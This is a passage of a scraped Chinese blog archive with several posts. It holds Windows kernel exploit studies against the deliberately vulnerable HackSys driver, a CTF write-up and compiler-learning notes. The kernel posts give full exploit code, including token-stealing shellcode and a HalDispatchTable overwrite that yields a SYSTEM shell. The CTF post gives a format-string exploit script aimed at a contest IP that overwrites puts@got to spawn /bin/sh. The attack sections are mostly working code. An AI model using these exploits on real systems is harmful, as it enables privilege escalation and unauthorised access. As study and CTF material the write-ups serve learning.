KernelBuffer: 0x%p\\n\", &amp;KernelBuffer); DbgPrint(\"[+] KernelBuffer Size: 0x%X\\n\", sizeof(KernelBuffer));#ifdef SECURE // Secure Note: This is secure because the developer is passing a size // equal to size of KernelBuffer to RtlCopyMemory()/memcpy(). Hence, // there will be no overflow RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, sizeof(KernelBuffer));#else DbgPrint(\"[+] Triggering Stack Overflow\\n\"); // Vulnerability Note: This is a vanilla Stack based Overflow vulnerability // because the developer is passing the user supplied size directly to // RtlCopyMemory()/memcpy() without validating if the size is greater or // equal to the size of KernelBuffer RtlCopyMemory((PVOID)KernelBuffer, UserBuffer, Size);#endif } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(\"[-] Exception Code: 0x%X\\n\", Status); } return Status;} 我们可以写一个demo去触发这个漏洞，然后使用Token替换的思路去提权。根据WEK.pdf的例程，demo如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869// bof_demo.cpp : Defines the entry point for the console application.//#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,METHOD_NEITHER,FILE_READ_DATA | FILE_WRITE_DATA)//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_NEITHER, FILE_ANY_ACCESS)int _tmain(int argc,_TCHAR* argv[]){ DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; PULONG lpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; SIZE_T nInBufferSize = 768 * sizeof(ULONG); //SIZE_T nInBufferSize = 1024 * sizeof(ULONG); printf(\"[*]Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"[*]Failed to get device handle : (0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"[*]Got the device Handle : 0x%X\\r\\n\", hDriver); printf(\"[*]Allocating Memory For Input Buffer\\r\\n\"); lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize); if (!lpInBuffer) { printf(\"[*]HeapAlloc failed :(0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"[*]Input buffer allocated as 0x%X bytes.\\r\\n\",nInBufferSize); printf(\"[*]Input buffer address : 0x%p\\r\\n\",lpInBuffer); printf(\"[*]Filling buffer with A's\\r\\n\"); //char *data = \"junk for get bof length....\"; //memcpy(lpInBuffer,data,nInBufferSize); RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41); printf(\"[*]Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, (LPVOID)lpInBuffer, (DWORD)nInBufferSize, NULL, 0, &amp;lpBytesReturned, NULL); printf(\"[*]IOCTL request completed,cleaning up da heap.\\r\\n\"); HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer); return 0;} 这段代码也很简单，自定义的buffer和size，然后传递给目标驱动的Stackoverflow的派遣例程。 0x04: 过程下面就可以开始先去确定bof的长度了，使用kali下的pattern_create和pattern_offset工具，他们的路径在kali2下是：/usr/share/metasploit-framework/tools/exploit。修改上述源码部分： 12char *data = \"result of ./pattern_create.rb -l 3506\";memcpy(lpInBuffer,data,nInBufferSize); 重新编译demo_bof，然后运行。崩溃了，eip被覆盖成了junk字符，然后确定偏移：payload应该是：2080 bytes + sc addr 经典的TokenStealingShellcode如下： 构造出来的exploit如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;//#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\\ METHOD_NEITHER, FILE_READ_DATA | FILE_WRITE_DATA)#define HACKSYS_EVD_IOCTL_STACK_OVERFLOW CTL_CODE(FILE_DEVICE_UNKNOWN,0x800,\\ METHOD_NEITHER, FILE_ANY_ACCESS)#define KTHREAD_OFFSET 0x124#define EPROCESS_OFFSET 0x044#define PID_OFFSET 0x084#define FLINK_OFFSET 0x088#define TOKEN_OFFSET 0x0c8#define SYSTEM_PID 0x004VOID TokenStealingShellcodeWin() { __asm { pushad mov eax, fs:[KTHREAD_OFFSET] mov eax, [eax + EPROCESS_OFFSET] mov ecx, eax mov ebx, [eax + TOKEN_OFFSET] mov edx, SYSTEM_PID SearchSystemPID : mov eax, [eax + FLINK_OFFSET] sub eax, FLINK_OFFSET cmp[eax + PID_OFFSET], edx jne SearchSystemPID mov edx, [eax + TOKEN_OFFSET] mov[ecx + TOKEN_OFFSET], edx popad ; recovery xor eax, eax; set NTSTATUS SUCEESS add esp, 12; fix stack pop ebp ret 8 }}int _tmain(int argc, _TCHAR* argv[]) { DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; //PULONG lpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; //SIZE_T nInBufferSize = 1024 * sizeof(ULONG); printf(\"Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"Failed to get device handle : (0x%X\\r\\n)\", GetLastError()); return 1; } printf(\"Got the device Handle : 0x%X\\r\\n\", hDriver); printf(\"Allocating Memory For Input Buffer\\r\\n\"); /* lpInBuffer = (PULONG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, nInBufferSize); if (!lpInBuffer) { printf(\"HeapAlloc failed :(0x%X\\r\\n)\",GetLastError()); return 1; } printf(\"Input buffer allocated as 0x%X bytes.\\r\\n\",nInBufferSize); printf(\"Input buffer address : 0x%p\\r\\n\",lpInBuffer); printf(\"Filling buffer with A's\\r\\n\"); */ //RtlFillMemory((PVOID)lpInBuffer, nInBufferSize, 0x41); printf(\"\\t[*]Payload is at : %p\\n\", TokenStealingShellcodeWin); //junk's length is 2080 CHAR *chBuffer = (CHAR*)malloc(2084); printf(\"\\t[*]Buffer is at : %p\\n\", &amp;chBuffer); memset(chBuffer, 0x41, 2048); memset(chBuffer + 2048, 0x42, 32); chBuffer[2080] = (DWORD)&amp;TokenStealingShellcodeWin &amp; 0x000000FF; chBuffer[2080 + 1] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x0000FF00) &gt;&gt; 8; chBuffer[2080 + 2] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0x00FF0000) &gt;&gt; 16; chBuffer[2080 + 3] = ((DWORD)&amp;TokenStealingShellcodeWin &amp; 0xFF000000) &gt;&gt; 24; printf(\"Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_STACK_OVERFLOW, chBuffer, 2084, NULL, 0, &amp;lpBytesReturned, NULL); system(\"cmd.exe\"); printf(\"IOCTL request completed,cleaning up da heap.\\r\\n\"); //HeapFree(GetProcessHeap(), 0, (LPVOID)lpInBuffer); CloseHandle(hDriver); return 0;} 重新编译后运行exploit程序。因为我这个xp在安装的时候没有装whoami工具，所以在看我使用了ProcessExplorer来看新启动的cmd的权限信息。在运行exploit之前运行exploit成功拿到最高权限。 0x05：关于shell code的分析想要分析shellcode是如何工作的，直接在它最前面加一个int 3然后重新编译，再把exploit跑起来，windbg里分析就好了。前面说到这个获取token要找到EPROCESS结构。 然而windows有个API PsGetCurrentProcess可以获取包含EPROCESS结构的process对象。反汇编看下这个API的实现： 使用dt -b -v _EPROCESS查看EPROCESS结构。之前在shellcode中看到的一些数据的定义，都可以在这里找到。下面来分析我们这段shellcode的工作。单步至此，获得当前进程的EPROCESS结构指针保存在ecx待用。下面进入循环寻找SYSTEM_PID,然后获取其token：这个循环跑的次数挺多，我直接下断跳出循环接着分析，这里来到token替换的部分：之后直接popad弹出之前保存的寄存器的值，然后回到原来的代码去执行，这个时候我们的进程(demo_bof)的token已经是system进程的token了，这个时候直接起一个cmd，就可以得到一个最高权限的shell了。这个时候F5，虚拟机那边就已经起来一个system32的cmd了。 0x06: 参考与引用Windows Kernel Exploitlhs0k师傅的帮助","link":"/2017/01/19/Windows-Kernel-Exploit-Study-1/"},{"title":"Windows Kernel Exploit Study(2)","text":"0x00:第二部分关于任意地址写类型漏洞利用的demo。 0x01: 环境相关环境和前一篇文章中的环境配置相同。 0x02：驱动及demo代码驱动中的代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051/// &lt;summary&gt;/// Trigger the Arbitrary Overwrite Vulnerability/// &lt;/summary&gt;/// &lt;param name=\"UserWriteWhatWhere\"&gt;The pointer to WRITE_WHAT_WHERE structure&lt;/param&gt;/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;NTSTATUS TriggerArbitraryOverwrite(IN PWRITE_WHAT_WHERE UserWriteWhatWhere) { PULONG What = NULL; PULONG Where = NULL; NTSTATUS Status = STATUS_SUCCESS; PAGED_CODE(); __try { // Verify if the buffer resides in user mode ProbeForRead((PVOID)UserWriteWhatWhere, sizeof(WRITE_WHAT_WHERE), (ULONG)__alignof(WRITE_WHAT_WHERE)); What = UserWriteWhatWhere-&gt;What; Where = UserWriteWhatWhere-&gt;Where; DbgPrint(\"[+] UserWriteWhatWhere: 0x%p\\n\", UserWriteWhatWhere); DbgPrint(\"[+] WRITE_WHAT_WHERE Size: 0x%X\\n\", sizeof(WRITE_WHAT_WHERE)); DbgPrint(\"[+] UserWriteWhatWhere-&gt;What: 0x%p\\n\", What); DbgPrint(\"[+] UserWriteWhatWhere-&gt;Where: 0x%p\\n\", Where);#ifdef SECURE // Secure Note: This is secure because the developer is properly validating if address // pointed by 'Where' and 'What' value resides in User mode by calling ProbeForRead() // routine before performing the write operation ProbeForRead((PVOID)Where, sizeof(PULONG), (ULONG)__alignof(PULONG)); ProbeForRead((PVOID)What, sizeof(PULONG), (ULONG)__alignof(PULONG)); *(Where) = *(What);#else DbgPrint(\"[+] Triggering Arbitrary Overwrite\\n\"); // Vulnerability Note: This is a vanilla Arbitrary Memory Overwrite vulnerability // because the developer is writing the value pointed by 'What' to memory location // pointed by 'Where' without properly validating if the values pointed by 'Where' // and 'What' resides in User mode *(Where) = *(What);#endif } __except (EXCEPTION_EXECUTE_HANDLER) { Status = GetExceptionCode(); DbgPrint(\"[-] Exception Code: 0x%X\\n\", Status); } return Status;} 可以看到这个代码很简单粗暴，用户空间接收What和Where，然后向Where指定的地址写What内容。根据Windows Kernel Exploit这个文档中给出的思路，覆盖HalDispatchTable + 4位置为tokenstealinshellcode的地址，然后触发这个内存覆盖，就可以利用这个漏洞来提权了。下面是demo的代码，为了编译通过，有些地方做了略微的改动。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196#include \"stdafx.h\"#include &lt;stdio.h&gt;#include &lt;Windows.h&gt;#include &lt;winioctl.h&gt;#include &lt;TlHelp32.h&gt;#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN,0x802,\\ METHOD_NEITHER, FILE_ANY_ACCESS)#define KTHREAD_OFFSET 0x124#define EPROCESS_OFFSET 0x044#define PID_OFFSET 0x084#define FLINK_OFFSET 0x088#define TOKEN_OFFSET 0x0c8#define SYSTEM_PID 0x004VOID TokenStealingShellcodeWin() { __asm { pushad mov eax, fs:[KTHREAD_OFFSET] mov eax, [eax + EPROCESS_OFFSET] mov ecx, eax mov ebx, [eax + TOKEN_OFFSET] mov edx, SYSTEM_PID SearchSystemPID : mov eax, [eax + FLINK_OFFSET] sub eax, FLINK_OFFSET cmp[eax + PID_OFFSET], edx jne SearchSystemPID mov edx, [eax + TOKEN_OFFSET] mov[ecx + TOKEN_OFFSET], edx popad }}typedef struct _WRITE_WHAT_WHERE { PULONG What; PULONG Where;}WRITE_WHAT_WHERE, *PWRITE_WHAT_WHERE;typedef enum { SystemBasicInformation, SystemProcessorInformation, SystemPerformanceInformation, SystemTimeOfDayInformation, SystemPathInformation, SystemProcessInfomation, SystemCallCountInformation, SystemDeviceInformation, SystemProcessorPerformanceInformation, SystemFlagsInformation, SystemCallTimeInformation, SystemModuleInformation}SYSTEM_INFORMATION_CLASS, *PSYSTEM_INFORMATION_CLASS;typedef struct { PVOID Reserved1; PVOID Reserved2; PVOID Base; ULONG ImageSize; ULONG Flags; WORD Id; WORD Rank; WORD w108; WORD NameOffset; CHAR imageName[256];}SYSTEM_MODULE, *PSYSTEM_MODULE;typedef struct { ULONG ModulesCount; SYSTEM_MODULE Modules[0];}SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;typedef NTSTATUS(WINAPI *NtQuerySystemInformation_t)(IN SYSTEM_INFORMATION_CLASS, \\ OUT PVOID SystemInformation, \\ IN ULONG SystemInformationLength, OUT PULONG ReturnLength);typedef NTSTATUS(WINAPI *NtQueryIntervalProfile_t)(IN ULONG ProfileSource, \\ OUT PULONG Interval);int _tmain(int argc, _TCHAR* argv[]) { PWRITE_WHAT_WHERE WriteWhatWhere = NULL; PVOID HalDispatchTabel = NULL; PVOID HalDispatchTabel4 = NULL; HMODULE ntoskrnl = NULL; PVOID kernelBase = NULL; HMODULE ntdll = NULL; //function NtQuerySystemInformation_t NtQuerySystemInformation; ////////////////////////////////////////////////////////////////// NTSTATUS Ntstatus = 0xc0000001; SIZE_T ReturnLength; PSYSTEM_MODULE_INFORMATION pSystemModuleInformation; PCHAR KernelImage; PVOID KernelBaseAddressInKernelMode; HMODULE hKernelInUserMode = NULL; PVOID EopPayload = &amp;TokenStealingShellcodeWin; ////////////////////////////////////////////////////////////////// NtQueryIntervalProfile_t NtQueryIntervalProfile; ULONG Interval = 0; ////////////////////////////////////////////////////////////////// DWORD lpBytesReturned; PVOID pMemoryAddress = NULL; PULONG IpInBuffer = NULL; LPCSTR lpDeviceName = (LPCSTR) \"\\\\\\\\.\\\\HackSysExtremeVulnerableDriver\"; printf(\"Getting the device handle\\r\\n\"); HANDLE hDriver = CreateFileA(lpDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED, NULL); if (hDriver == INVALID_HANDLE_VALUE) { printf(\"Failed to get device handle : (0x%X\\r\\n)\", GetLastError()); return 1; } printf(\"Got the device Handle : 0x%X\\r\\n\", hDriver); WriteWhatWhere = (PWRITE_WHAT_WHERE)HeapAlloc(GetProcessHeap(), \\ HEAP_ZERO_MEMORY, \\ sizeof(WRITE_WHAT_WHERE)); //Step 3. ntdll = GetModuleHandle(L\"ntdll.dll\"); NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, \\ \"NtQuerySystemInformation\"); Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \\ NULL, \\ 0, \\ &amp;ReturnLength); pSystemModuleInformation = (PSYSTEM_MODULE_INFORMATION)HeapAlloc(GetProcessHeap(), \\ HEAP_ZERO_MEMORY, \\ ReturnLength); Ntstatus = NtQuerySystemInformation(SystemModuleInformation, \\ pSystemModuleInformation, \\ ReturnLength, \\ &amp;ReturnLength); KernelBaseAddressInKernelMode = pSystemModuleInformation-&gt;Modules[0].Base; KernelImage = strrchr((PCHAR)pSystemModuleInformation-&gt;Modules[0].imageName, '\\\\') + 1; //Step 1 and 2: printf(\"KernelImage : %s\\n\", KernelImage); hKernelInUserMode = LoadLibraryA(KernelImage); HalDispatchTabel = (PVOID)GetProcAddress(hKernelInUserMode, \"HalDispatchTabel\"); //Step 4: HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel - (ULONG)hKernelInUserMode); HalDispatchTabel = (PVOID)((ULONG)HalDispatchTabel + (ULONG)KernelBaseAddressInKernelMode); HeapFree(GetProcessHeap(), 0, (LPVOID)pSystemModuleInformation); FreeLibrary(ntdll); FreeLibrary(hKernelInUserMode); //end HalDispatchTabel4 = (PVOID)((ULONG)HalDispatchTabel + sizeof(PVOID)); WriteWhatWhere-&gt;What = (PULONG)&amp;EopPayload; WriteWhatWhere-&gt;Where = (PULONG)HalDispatchTabel4; printf(\"\\t[*]Where : 0x%p\\n\", WriteWhatWhere-&gt;Where); printf(\"\\t[*]What : 0x%p\\n\", WriteWhatWhere-&gt;What); printf(\"\\t[*]Exp : 0x%p\\n\", EopPayload); printf(\"Send IOCTL request\\r\\n\"); DeviceIoControl(hDriver, HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE, (LPVOID)WriteWhatWhere, sizeof(WriteWhatWhere), NULL, 0, &amp;lpBytesReturned, NULL); //triger the memory overwrite ntdll = LoadLibraryA(\"ntdll.dll\"); NtQueryIntervalProfile = (NtQueryIntervalProfile_t)GetProcAddress(ntdll, \"NtQueryIntervalProfile\"); NtQueryIntervalProfile(0x1337, &amp;Interval); HeapFree(GetProcessHeap(), 0, (LPVOID)WriteWhatWhere); system(\"cmd.exe\"); printf(\"IOCTL request completed,cleaning up da heap.\\r\\n\"); CloseHandle(hDriver); return 0;} 代码在这里 0x03: Exploit在运行exp.exe之前 运行之后 0x04：参考与引用Windows Kernel Exploit","link":"/2017/01/20/Windows-Kernel-Exploit-Study-2/"},{"title":"cctf pwn350","text":"0x00:之前打了CCTF，在CCTF的过程中遇到一个比较有意思的思路，记录一下。 0x01:可以看到，这是一个 fmt 的漏洞，不过很简单，接收的输入都在stack中，可以确定输入在栈中的位置，可以做到 任意地址读写。一般来说，对于这种类型的漏洞，写shellcode到合适的地址然后跳转过去，或者leak 出 system地址，改其他函数的got，都是可以拿一个shell的。本来，我的思路很窄，想的是构造一个循环，去leak我需要的函数，然后改got去拿shell。joker师傅提点了我一下，可以leak任意两个函数地址，然后去 libcdb.com 查一波libc的版本，就可以确定libc版本，从而得到system的偏移。 0x02:综上利用思路就是，leak出任意两个函数地址，然后确定system()的偏移，改掉puts@got,构造puts调用的参数为/bin/sh 就可以拿到shell啦。这是我找libc的时候截图 0x03:exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061from zio import *#target = './pwn3'target = ('120.27.155.82',9000)r_m = COLORED(RAW, \"green\")w_m = COLORED(RAW, \"red\")pwd = \"rxraclhm\"def put_file(name,content):4io.read_until('ftp&gt;')4io.writeline(\"put\")4io.read_until(\"upload:\")4io.writeline(name)4io.read_until(\"content:\")4io.writeline(content)def get_file(name):4io.read_until('ftp&gt;')4io.writeline(\"get\")4io.read_until('get:')4io.writeline(name)def get_file2(name):4io.writeline(\"get\")4io.read_until('get:')4io.writeline(name)def put_file2(name,content):4io.writeline(\"put\")4io.read_until(\"upload:\")4io.writeline(name)4io.read_until(\"content:\")4io.writeline(content)pl1 = l32(0x0804A014) #printf@gotpl1 += \",%7$s,\"pl2 = l32(0x0804A024) #malloc@gotpl2 += \",%7$s,\"pl3 = l32(0x0804A028) #puts@gotpl3 += \",%7$s,\"offset_puts_to_system = 0x00065650 - 0x00040190#offset_puts_to_system = 0x269a0 # local io = zio(target,print_read=r_m,print_write=w_m,timeout=999)io.read_until('):')io.writeline(pwd)put_file(\"a\",pl3)#raw_input('$$$$')get_file(\"a\")rec = io.read_until('&gt;').strip()junk1,addr,junk2 = rec.split(',')print \"[*]puts is at:%s\" % (addr[0:4][::-1] or '').encode('hex')addr = addr[0:4][::-1].encode('hex')system_addr = hex(int(addr,16) - offset_puts_to_system)puts_addr = hex(int(addr,16))print \"[*]system is at:\" + system_addrx = int(addr,16) - offset_puts_to_system #a,b,c,d = [(x &gt;&gt; i) &amp; 0b11111111 for i in range(0, 25, 16)]a,b = [(x &gt;&gt; i) &amp; 0b1111111111111111 for i in range(0, 25, 16)]print hex(a)+\",\"+hex(b)put_file2(\"c\",l32(0x0804A028)+\"%%%dc\"%(a-4)+\"%7$hn\")raw_input('$$$')get_file(\"c\")put_file2(\"d\",l32(0x0804A028+2)+\"%%%dc\"%(b-4)+\"%7$hn\")get_file(\"d\")put_file2(\"/bin/sh;\",\"test\")io.writeline('dir')io.interact() get shell","link":"/2016/04/30/cctf-pwn350/"},{"title":"codegate2017-angrybird","text":"0x00:最近又在看angr了，总结了一下常见的用法以及一些模板…正好这个题目可以用上。 0x01：题目分析x64的elf文件，运行一下直接退出了： 1234# muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:12]$ ./angrybird# muhe @ MUHE-PC in /mnt/c/Users/muhe/Desktop [21:25:15] C:1$ 直接丢进IDA看汇编 123456789101112131415161718192021222324252627282930313233343536.text:0000000000400761 push rbp.text:0000000000400762 mov rbp, rsp.text:0000000000400765 add rsp, 0FFFFFFFFFFFFFF80h.text:0000000000400769 mov rax, fs:28h.text:0000000000400772 mov [rbp+var_8], rax.text:0000000000400776 xor eax, eax.text:0000000000400778 cmp eax, 0.text:000000000040077B jz _exit.text:0000000000400781 mov [rbp+var_70], offset off_606018.text:0000000000400789 mov [rbp+var_68], offset off_606020.text:0000000000400791 mov [rbp+var_60], offset off_606028.text:0000000000400799 mov [rbp+var_58], offset off_606038.text:00000000004007A1 mov eax, 0.text:00000000004007A6 call sub_4006F6.text:00000000004007AB mov [rbp+n], eax.text:00000000004007AE mov eax, 0.text:00000000004007B3 call sub_40070C.text:00000000004007B8 mov eax, 0.text:00000000004007BD call sub_40072A.text:00000000004007C2 mov rdx, cs:stdin ; stream.text:00000000004007C9 mov ecx, [rbp+n].text:00000000004007CC lea rax, [rbp+s].text:00000000004007D0 mov esi, ecx ; n.text:00000000004007D2 mov rdi, rax ; s.text:00000000004007D5 call _fgets.text:00000000004007DA movzx edx, [rbp+s].text:00000000004007DE movzx eax, [rbp+var_4F].text:00000000004007E2 xor eax, edx.text:00000000004007E4 mov [rbp+var_30], al.text:00000000004007E7 movzx eax, [rbp+var_30].text:00000000004007EB cmp al, 0Fh.text:00000000004007ED jg short loc_400803.text:00000000004007EF mov edi, offset aMelong ; &quot;melong&quot;.text:00000000004007F4 call _puts.text:00000000004007F9 mov edi, 1 ; status.text:00000000004007FE call _exit 这个cm非常规，前面很多乱七八糟的函数，就是让你执行不到正常逻辑去。如果想要执行到00000000004007C2去，然后去逆向算法什么，需要把前面的一些拦路虎全部patch掉…我开始在做patch一点，调试一点，然后继续patch…后来实在忍不了，太坑了，直接上符号执行算了。 0x02：解决模板使用angr符号执行解题可以不从main开始跑，只要指定一个入口就好了 12345678910import angrprog = angr.Project('./cm')#s = prog.factory.blank_state(addr=0x0804864B)s = prog.factory.entry_state(args=[\"./cm\"])pg = prog.factory.path_group(s, immutable=False)path = pg.explore(find=(0x0804864B,))print pathprint pg.found[0].state.se._solver.result.model 不过后面print的部分需要做一点改动…因为有些题目输入是从命令行参数给的，有些是read那种读取的。 1234567.text:0000000000404FAB loc_404FAB: ; CODE XREF: main+4834\u0018j.text:0000000000404FAB lea rax, [rbp+s].text:0000000000404FAF mov rsi, rax.text:0000000000404FB2 mov edi, offset format ; &quot;you typed : %s\\n&quot;.text:0000000000404FB7 mov eax, 0.text:0000000000404FBC call _printf.text:0000000000404FC1 mov eax, 0 执行到这里0000000000404FC1就可以，不过要使用posix相关的方法去提取输入。 solve.py12345678910111213141516171819202122#!/usr/bin/env python# coding=utf-8import angrstart_addr = 0x00000000004007C2def main(): prog = angr.Project('angrybird', load_options={\"auto_load_libs\": False}) #s = prog.factory.entry_state(addr=start_addr) s = prog.factory.blank_state(addr=start_addr) path = prog.factory.path(s) pg = prog.factory.path_group(path, immutable=False) find = pg.explore(find=(0x0000000000404FC1)) print find print pg.found[-1].state.posix.dumps(0)if __name__ == '__main__': main() 结果 1234(angr) ➜ Desktop python solve.py WARNING | 2017-03-04 05:33:08,495 | simuvex.plugins.symbolic_memory | Concretizing symbolic length. Much sad; think about implementing.&lt;PathGroup with 418 deadended, 4 active, 1 found&gt;Im_so_cute&amp;pretty_:)\u0004�\u0002 @\u0002 \u0001� \u0010 J\u0004 \u0002\u0010\u0002 \u0010 \u0001�\u0001\u0010\u0010\u0002\u0004 0x03：参考与引用Ysc‘s blog","link":"/2017/03/04/codegate2017-angrybird/"},{"title":"compiler学习","text":"0x00:前言一直想做的fuzzer涉及到很多语法相关的东西，编译原理相关的补课迫在眉睫-。- 不过也只能慢慢的来学习。这篇文章准备慢慢更新，涉及我的学习过程和对以前的大佬的一个toy compiler的学习，理论+实践才是王道。 0x01:关于学习1. 公开课1.1 哈工大的编译原理陈老师讲的超级好～慢慢看，看了下，这个是基于龙书讲的，当然没有展开很多，还是需要多下功夫去看看； 1.2 中科大编译原理课程这个也行，通俗易懂，但是个人感觉没有哈工大那个课程全面。 综合个人感觉，概念太多，涉及的知识杂而广，所以有个大概印象，需要什么的时候再深入看会比较好一点。 2. 书2.1 龙书我是看不下去...好枯燥，也就下了个pdf，看公开课的时候用来当参考，一些概念记不清了就去翻一翻啥的。 2.2 《自制编译器》这本不错，实践的一本书，不过，没有看过一些基础内容的就别看了，这本书没什么太多的基础内容介绍，就是上来就从词法分析、语法分析、代码生成一点一点地拿代码给你讲；是用java实现的一个类c语言的一个编译器。所以这本我是放在后面一点的位置再去看的，基本看完，但是需要结合去看他的代码，还需要仔细过一过。 2.3 flex与bison这个不错两百多页的小薄本，但是内容很多，代码要好好消化，还是那句话，没有基础知识(from 龙书or公开课)，就算了，要不然看到作者写的那些代码理解起来很费劲。这本只看了部分，只到sql那个分析。 2.4 现代编译器(虎书)偏实践的一本，但是我没看 233333 2.5 Antlr4 权威指南有一定基础，推荐看。结合antlr4可以很快上手～ 而且这个东西应用十分广泛 -。- 比如在bug hunting的部分～ 3. 实践项目3.1 一个外国人写的toy compiler，based on llvm3.2 《flex与bison》中的那个sql的解析挺不错的3.3 《自制编译器》中的cbc3.4 llvm 文档中的Kaleidoscope3.5 手把手教你构建 C 语言编译器0x02 : toy compiler学习1. 基本情况老外写的一个简易的compiler，使用flex+bison做前端，llvm后端代码生成的一个demo。 writing-your-own-toy-compiler 代码在GitHub上可以找到 2. 项目结构稍微复杂一些、大一些的项目，阅读之前最好搞明白项目的结构，这个toy compiler虽然代码量不大，但是最好还是搞明白结构，方便后面的阅读。 编译的流程是词法分析、语法分析、语义分析、代码生成。 根据这个过程去分(有些头文件在不同的过程中都会用到，比如node.h)： 词法分析 tokens.l 、parser.hpp、node.h 语法分析 parser.y、node.h 代码生成 codegen.cpp、codegen.h、corefn.cpp 其他 main.cpp toy compiler的主体 example.txt 测试用例 3. 代码阅读学习3.1 主体部分 main.cpp123456789101112yyparse();cout &lt;&lt; programBlock &lt;&lt; endl;// see http://comments.gmane.org/gmane.comp.compilers.llvm.devel/33877InitializeNativeTarget();InitializeNativeTargetAsmPrinter();InitializeNativeTargetAsmParser();CodeGenContext context;createCoreFunctions(context);context.generateCode(*programBlock);context.runCode(); 调用yyparse解析输入，然后输出progranblock之后，使用llvm做代码生成。 3.2 词法分析词法分析是使用flex做的，词法分析是把输入分割成token序列，在tokens.l中，定义了各种token。 123456789101112131415161718192021222324252627[ \\t\\n] ;&quot;extern&quot; return TOKEN(TEXTERN);&quot;return&quot; return TOKEN(TRETURN);[a-zA-Z_][a-zA-Z0-9_]* SAVE_TOKEN; return TIDENTIFIER;[0-9]+\\.[0-9]* SAVE_TOKEN; return TDOUBLE;[0-9]+ SAVE_TOKEN; return TINTEGER;&quot;=&quot; return TOKEN(TEQUAL);&quot;==&quot; return TOKEN(TCEQ);&quot;!=&quot; return TOKEN(TCNE);&quot;&lt;&quot; return TOKEN(TCLT);&quot;&lt;=&quot; return TOKEN(TCLE);&quot;&gt;&quot; return TOKEN(TCGT);&quot;&gt;=&quot; return TOKEN(TCGE);&quot;(&quot; return TOKEN(TLPAREN);&quot;)&quot; return TOKEN(TRPAREN);&quot;{&quot; return TOKEN(TLBRACE);&quot;}&quot; return TOKEN(TRBRACE);&quot;.&quot; return TOKEN(TDOT);&quot;,&quot; return TOKEN(TCOMMA);&quot;+&quot; return TOKEN(TPLUS);&quot;-&quot; return TOKEN(TMINUS);&quot;*&quot; return TOKEN(TMUL);&quot;/&quot; return TOKEN(TDIV); 匹配的话就是正则表达式的那种匹配原则，也就是说，在源码里遇到了对应的token，就返回{字面值，TOKEN名}这样的序列。不同的token类型，在parser.hpp中定义(宏定义)。 3.2 语法分析这部分是使用了bison，从token序列依照提前定义好的语法规则，生成对应的ast。 规则在parser.y里 123456789101112131415161718192021222324252627program : stmts { programBlock = $1; } ; stmts : stmt { $$ = new NBlock(); $$-&gt;statements.push_back($&lt;stmt&gt;1); } | stmts stmt { $1-&gt;statements.push_back($&lt;stmt&gt;2); } ;stmt : var_decl | func_decl | extern_decl | expr { $$ = new NExpressionStatement(*$1); } | 